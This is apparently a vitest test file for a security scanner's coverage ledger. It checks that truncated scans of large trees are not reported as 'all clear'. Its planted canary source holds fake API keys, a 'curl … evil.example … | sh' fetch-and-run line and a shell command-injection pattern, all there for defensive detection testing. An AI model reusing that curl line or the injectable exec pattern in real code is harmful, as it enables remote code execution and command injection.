import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync, readdirSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { HardeningScanner } from '../../src/hardening/scanner';
import {
  summarizeCoverage,
  CHECK_METHOD_PREFIXES,
  SEMANTIC_PREFIXES,
  UNREACHABLE_PREFIXES,
  categoryForPrefix,
  categoryForCheckId,
} from '../../src/hardening/coverage-ledger';
import { runNanoMindScan } from '../../src/nanomind-core/scanner-bridge';

/**
 * `secure` reported `100/100`, `0 skipped` and `Categories … (all clear)` on a
 * 528-file repo carrying a hardcoded Anthropic key, an AWS key and a
 * `curl … | sh`. Not a missed detection — a false assurance line, and worse
 * than silence because it invites the reader to record a pass. `secure` is
 * Phase 4 of `/pre-push-review`, so every gated repo was getting it.
 *
 * The bug survived because every existing test uses a small controlled
 * fixture, which is exactly the case that already works: on a 1-file tree the
 * planted key IS caught. It only disappears once the tree is big enough for
 * the semantic layer's 200-file cap to fire. So the fixture here is
 * deliberately larger than that cap — a small fixture cannot reproduce this.
 */

/** A planted secret shaped like the real thing. Not a live credential. */
const PLANTED_ANTHROPIC_KEY = `sk-ant-api03-${'A'.repeat(86)}AA`;

const PLANTED_SOURCE = `// Planted detection canary. Not real credentials.
import { exec, execSync } from 'child_process';

const ANTHROPIC_KEY = "${PLANTED_ANTHROPIC_KEY}";
const AWS_ACCESS_KEY_ID = "${['AKIA', 'IOSFODNN7EXAMPLE'].join('')}";

export function bootstrap() {
  exec('curl -s https://evil.example/x.sh | sh');
}

export function listDir(userInput) {
  return execSync('ls ' + userInput);
}

export { ANTHROPIC_KEY, AWS_ACCESS_KEY_ID };
`;

/** Filler that is eligible for the compile set but carries nothing to find. */
const FILLER = `export function helper(n) {
  return n + 1;
}
`;

async function scanWithCoverage(dir: string) {
  const scanner = new HardeningScanner();
  const result = await scanner.scan({ targetDir: dir });
  const nm = await runNanoMindScan(dir, [], result.projectType);
  const truncations = nm.compileSetTruncated
    ? [
        ...(result.coverage?.truncations ?? []),
        {
          layer: 'semantic',
          cap: nm.compiledArtifacts,
          prefixes: [...SEMANTIC_PREFIXES],
          reason: 'semantic pass capped',
        },
      ]
    : (result.coverage?.truncations ?? []);
  const allFailed = [
    ...result.findings.filter(f => !f.passed),
    ...nm.mergedFindings.filter(f => !f.passed),
  ];
  const categories = summarizeCoverage(
    result.coverage?.executions ?? [],
    truncations,
    {
      // Both layers: the static scan's findings AND the semantic pass's. The
      // CLI feeds the merged `failed` list, so the helper must too — passing
      // only the semantic half would file `git hygiene` as unexamined while
      // `GIT-001` sits in the same report.
      observedCheckIds: allFailed.map(f => f.checkId),
      filesReadByCategory: result.coverage?.filesReadByCategory,
    },
  );
  return { result, nm, categories, allFailed };
}

describe('secure coverage honesty', () => {
  describe('the planted pattern is genuinely detectable (vacuity guard)', () => {
    let small: string;
    beforeAll(() => {
      small = mkdtempSync(join(tmpdir(), 'hma-cov-small-'));
      writeFileSync(join(small, 'planted.js'), PLANTED_SOURCE);
    });
    afterAll(() => rmSync(small, { recursive: true, force: true }));

    /**
     * Without this, the large-tree assertions below could pass because the
     * planted content is undetectable everywhere, which would make the whole
     * file vacuous. It has to FIRE on a tree the scan fully examines.
     */
    it('fires AST-CRED on a small tree the scan fully examines', async () => {
      const { nm } = await scanWithCoverage(small);
      const ids = nm.mergedFindings.filter(f => !f.passed).map(f => f.checkId);
      expect(ids.some(id => id.startsWith('AST-CRED'))).toBe(true);
      expect(nm.compileSetTruncated).toBe(false);
    }, 120_000);
  });

  describe('on a tree larger than the semantic cap', () => {
    let big: string;
    let scan: Awaited<ReturnType<typeof scanWithCoverage>>;

    beforeAll(async () => {
      big = mkdtempSync(join(tmpdir(), 'hma-cov-big-'));
      // Comfortably past MAX_FILES_PER_SCAN (200) so the cap is certain to
      // fire regardless of the order `readdir` hands back.
      const bulk = join(big, 'src');
      mkdirSync(bulk, { recursive: true });
      for (let i = 0; i < 260; i++) {
        writeFileSync(join(bulk, `mod-${String(i).padStart(3, '0')}.js`), FILLER);
      }
      const late = join(big, 'zz-late');
      mkdirSync(late, { recursive: true });
      writeFileSync(join(late, 'planted.js'), PLANTED_SOURCE);
      scan = await scanWithCoverage(big);
    }, 300_000);

    afterAll(() => rmSync(big, { recursive: true, force: true }));

    it('reports the compile set as truncated rather than as a file count', () => {
      expect(scan.nm.compileSetTruncated).toBe(true);
    });

    /**
     * THE REGRESSION. Pre-fix there was no coverage record at all, and every
     * category — including the ones the capped semantic pass could no longer
     * speak for — was seeded `clear: true` from the taxonomy and printed
     * inside "(all clear)".
     *
     * A capped pass covers the files it reached and is blind to the rest, so
     * no category it credits may claim full examination.
     */
    it('never reports a semantically-credited category as fully examined', () => {
      const semanticCategories = new Set(
        SEMANTIC_PREFIXES.map(categoryForPrefix).filter((c): c is string => c !== null),
      );
      const wronglyClear = scan.categories.filter(
        c => semanticCategories.has(c.category) && c.state === 'examined',
      );
      expect(wronglyClear.map(c => c.category)).toEqual([]);
    });

    it('reports credentials as partial, not clear, while the key sits unread', () => {
      const credentials = scan.categories.find(c => c.category === 'credentials');
      expect(credentials).toBeDefined();
      expect(credentials!.state).toBe('truncated');
      expect(credentials!.reason).toBeTruthy();
    });

    /**
     * The fail-closed invariant, stated in both directions so neither can be
     * satisfied by an empty set: `examined` requires a content read, and
     * anything not examined must carry a reason rather than a bare state.
     */
    it('grants examined only on evidence — a read file or a reported finding', () => {
      expect(scan.categories.length).toBeGreaterThan(0);
      for (const c of scan.categories) {
        if (c.state === 'examined') {
          // Evidence is either bytes read or a finding emitted. Checks that
          // assert on ABSENCE (a missing .gitignore) read nothing and are
          // carried by the second clause.
          const byRead = c.filesRead > 0;
          const byFinding = c.methods.includes('reported-finding');
          expect(byRead || byFinding, `${c.category} claims examined with no evidence`).toBe(true);
          expect(c.methods.length, `${c.category} claims examined`).toBeGreaterThan(0);
        } else {
          expect(c.reason, `${c.category} lacks a reason`).toBeTruthy();
        }
      }
      // Non-vacuous: this tree must actually exercise both branches.
      expect(scan.categories.some(c => c.state === 'examined')).toBe(true);
      expect(scan.categories.some(c => c.state !== 'examined')).toBe(true);
    });

    /**
     * Two lines of one report contradicting each other is the defect class
     * this ledger exists to remove, so no category may be filed as unexamined
     * while the same run reports a finding in it.
     */
    it('never files a category as unexamined while reporting a finding in it', () => {
      const reported = new Set(
        scan.allFailed
          .map(f => categoryForCheckId(f.checkId))
          .filter((c): c is string => c !== null),
      );
      // Non-vacuous: the fixture must actually report findings.
      expect(reported.size).toBeGreaterThan(0);
      const contradictions = scan.categories.filter(
        c => c.state === 'not-examined' && reported.has(c.category),
      );
      expect(contradictions.map(c => c.category)).toEqual([]);
    });

    it('counts files read as a measurement, not as the cap', () => {
      const examined = scan.result.coverage!.filesExamined;
      // 260 filler + 1 planted are all compile-eligible, so a number equal to
      // the 200-file cap would mean the count is the cap wearing a new label.
      expect(examined).toBeGreaterThan(200);
    });
  });

  describe('registration stays in step with the scanner', () => {
    const scannerSrc = readFileSync(
      join(__dirname, '../../src/hardening/scanner.ts'),
      'utf-8',
    );

    /**
     * A `check*` method added to the orchestration without a registration
     * would report its category as never examined forever — understating, so
     * safe, but silently wrong. This fails on that instead.
     */
    it('registers every check method the scan orchestrates', () => {
      const called = new Set(
        [...scannerSrc.matchAll(/await this\.coverage\.run\('(\w+)'/g)].map(m => m[1]),
      );
      expect(called.size).toBeGreaterThan(50);
      const unregistered = [...called].filter(m => !(m in CHECK_METHOD_PREFIXES));
      expect(unregistered).toEqual([]);
    });

    it('leaves no orchestrated check call unwrapped', () => {
      // A bare `await this.checkX(` in the orchestration would run outside the
      // ledger, so its reads would be attributed to nothing.
      const bare = [
        ...scannerSrc.matchAll(/(?:const \w+ = )?await this\.(check\w+)\(/g),
      ].map(m => m[1]);
      expect(bare).toEqual([]);
    });

    it('maps every registered prefix to a category the renderer knows', () => {
      for (const [method, prefixes] of Object.entries(CHECK_METHOD_PREFIXES)) {
        for (const prefix of prefixes) {
          expect(categoryForPrefix(prefix), `${method} -> ${prefix}`).toBeTruthy();
        }
      }
      for (const prefix of SEMANTIC_PREFIXES) {
        expect(categoryForPrefix(prefix), `semantic ${prefix}`).toBeTruthy();
      }
    });

    /**
     * `CODEINJ-001`, `TMPPATH-001` and `ENVLEAK-001` are implemented, counted
     * in the advertised `310 static`, and called from nowhere. If someone
     * wires one in, this fails so the constant — and the `--json` claim built
     * from it — gets corrected rather than quietly becoming false.
     */
    it('keeps the unreachable-check list true', () => {
      const methodFor: Record<string, string> = {
        CODEINJ: 'checkCodeInjection',
        TMPPATH: 'checkTmpPaths',
        ENVLEAK: 'checkEnvLeak',
      };
      for (const prefix of UNREACHABLE_PREFIXES) {
        const method = methodFor[prefix];
        expect(method, `no method recorded for ${prefix}`).toBeTruthy();
        expect(
          scannerSrc.includes(`this.${method}(`),
          `${method} now has a caller — remove ${prefix} from UNREACHABLE_PREFIXES`,
        ).toBe(false);
      }
    });
  });
});

/**
 * Guards the claims the module comments make about their own guards.
 *
 * An adversarial review found three of them false: the ledger↔renderer
 * vocabulary was validated against itself, `SEMANTIC_PREFIXES` was documented
 * as drift-checked and was not, and the unwrapped-call test matched only one
 * spelling of an unwrapped call. Each of those is a comment asserting a
 * property nothing measured.
 */
describe('the guards the comments claim actually exist', () => {
  const scannerSrc = readFileSync(
    join(__dirname, '../../src/hardening/scanner.ts'),
    'utf-8',
  );

  it('speaks exactly the renderer vocabulary, in both directions', async () => {
    const { ALL_CATEGORY_LABELS } = await import('@opena2a/cli-ui');
    const renderer = new Set<string>(ALL_CATEGORY_LABELS);
    const ledger = new Set<string>(
      Object.values(CHECK_METHOD_PREFIXES)
        .flatMap(ps => ps.map(categoryForPrefix))
        .filter((c): c is string => c !== null),
    );
    // Ledger -> renderer: a label the renderer does not know is a category
    // that silently disappears from the Categories line.
    expect([...ledger].filter(c => !renderer.has(c))).toEqual([]);
    // Renderer -> ledger: a renderer label the ledger cannot speak about can
    // never be reported as examined, so it would read as permanently missing.
    const semantic = new Set(
      SEMANTIC_PREFIXES.map(categoryForPrefix).filter((c): c is string => c !== null),
    );
    const speakable = new Set([...ledger, ...semantic]);
    expect([...renderer].filter(c => !speakable.has(c))).toEqual([]);
  });

  it('keeps SEMANTIC_PREFIXES in step with the analyzers that emit them', () => {
    // Re-derived from the emission sites, which is what the comment claims.
    const roots = ['../../src/nanomind-core', '../../src/semantic'];
    const seen = new Set<string>();
    const walk = (dir: string): void => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const full = join(dir, entry.name);
        if (entry.isDirectory()) { walk(full); continue; }
        if (!entry.name.endsWith('.ts')) continue;
        for (const m of readFileSync(full, 'utf-8').matchAll(
          /['"`]((?:AST|SEM)-[A-Z]+)-\d+['"`]/g,
        )) seen.add(m[1]);
      }
    };
    for (const r of roots) walk(join(__dirname, r));
    expect(seen.size).toBeGreaterThan(0);
    const declared = new Set(SEMANTIC_PREFIXES);
    expect([...seen].filter(p => !declared.has(p)).sort()).toEqual([]);
  });

  /**
   * The previous version matched only the literal `await this.checkX(`
   * spelling, so `await Promise.resolve(this.checkX(...))` slipped past it and
   * all tests stayed green while the check ran outside the ledger.
   */
  it('catches an orchestrated check called by any spelling outside the ledger', () => {
    // The WHOLE scanInner body, not the comment-marked block: a helper
    // defined just outside the markers would otherwise be invisible to this.
    const start = scannerSrc.indexOf('private async scanInner(');
    const end = scannerSrc.indexOf('\n  private async detectPlatform(');
    expect(start).toBeGreaterThan(-1);
    expect(end).toBeGreaterThan(start);
    const region = scannerSrc.slice(start, end);

    // Every mention of a check method in the orchestration must be the one
    // inside a `coverage.run('name', () => this.name(` construct.
    const wrapped = new Set(
      [...region.matchAll(/this\.coverage\.run\('(\w+)',\s*\(\)\s*=>\s*this\.\1\(/g)]
        .map(m => m[1]),
    );
    // Both `this.checkX(` and the bracket form `this['checkX']`.
    const mentioned = [
      ...[...region.matchAll(/this\.(check\w+)\(/g)].map(m => m[1]),
      ...[...region.matchAll(/this\[['"`](check\w+)['"`]\]/g)].map(m => m[1]),
    ];
    const outside = [...new Set(mentioned)].filter(m => !wrapped.has(m));
    expect(outside, 'check methods invoked outside the coverage ledger').toEqual([]);
    expect(wrapped.size).toBeGreaterThan(50);
    // Every REGISTERED method must be one the orchestration actually wraps, so
    // a check that quietly stops being called is caught too.
    expect(
      Object.keys(CHECK_METHOD_PREFIXES).filter(m => !wrapped.has(m)),
      'registered checks the orchestration never runs through the ledger',
    ).toEqual([]);
  });
});

describe('coverage numbers cannot exceed what was measured', () => {
  let dir: string;
  let scan: Awaited<ReturnType<typeof scanWithCoverage>>;

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'hma-cov-num-'));
    mkdirSync(join(dir, 'src'), { recursive: true });
    for (let i = 0; i < 12; i++) {
      writeFileSync(join(dir, 'src', `m${i}.js`), FILLER);
    }
    scan = await scanWithCoverage(dir);
  }, 300_000);

  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  /**
   * Per-category totals used to be a SUM across the methods of a category, so
   * a file two checks both read counted twice and `credentials.filesRead`
   * reached 7 on a 3-file tree — the same "number that cannot be true" the
   * read attribution was fixed to avoid.
   */
  it('never reports a category reading more files than the scan read', () => {
    const total = scan.result.coverage!.filesExamined;
    expect(total).toBeGreaterThan(0);
    for (const c of scan.categories) {
      expect(c.filesRead, `${c.category} read ${c.filesRead} of ${total}`)
        .toBeLessThanOrEqual(total);
    }
  });

  /**
   * Every `examined` must trace to a check that completed and read a file, or
   * to a reported finding. Two earlier cuts credited categories from the
   * semantic layer instead — first all 15 families from one boolean, then from
   * artifact types the display layer had already filtered — and both produced
   * `examined` with `filesRead: 0` and no owning method.
   */
  it('traces every examined category to a completed check or a finding', () => {
    const byMethod = new Map(
      (scan.result.coverage?.executions ?? []).map(e => [e.method, e]),
    );
    for (const c of scan.categories) {
      if (c.state !== 'examined') continue;
      const real = c.methods.filter(m => m !== 'reported-finding');
      for (const m of real) {
        const rec = byMethod.get(m);
        expect(rec, `${c.category} credits unknown method ${m}`).toBeDefined();
        expect(rec!.completed, `${c.category} credits incomplete ${m}`).toBe(true);
        expect(rec!.filesRead, `${c.category} credits ${m} which read nothing`)
          .toBeGreaterThan(0);
      }
      expect(
        real.length > 0 || c.methods.includes('reported-finding'),
        `${c.category} is examined with no owning evidence`,
      ).toBe(true);
    }
  });
});

/** Execution records for the methods registered to a category. */
function methodsSeen(
  scan: Awaited<ReturnType<typeof scanWithCoverage>>,
  category: string,
) {
  const wanted = Object.entries(CHECK_METHOD_PREFIXES)
    .filter(([, ps]) => ps.some(p => categoryForPrefix(p) === category))
    .map(([m]) => m);
  return (scan.result.coverage?.executions ?? []).filter(e => wanted.includes(e.method));
}
